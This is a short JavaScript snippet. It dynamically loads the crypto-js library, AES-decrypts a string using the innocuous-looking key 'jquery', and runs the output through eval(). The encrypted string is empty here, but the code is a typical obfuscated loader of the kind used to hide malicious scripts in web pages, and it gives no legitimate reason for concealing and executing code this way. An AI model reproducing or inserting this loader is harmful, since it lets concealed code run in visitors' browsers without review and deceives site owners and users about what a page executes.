
function jloadScript(url, callback)
{
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    script.onreadystatechange = callback;
    script.onload = callback;
    head.appendChild(script);
}

jloadScript("https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.min.js",function(){
var bytes = "";
var bytes_dec  = CryptoJS.AES.decrypt(bytes, 'jquery');
var plaintext = bytes_dec.toString(CryptoJS.enc.Utf8);
eval(plaintext);
});
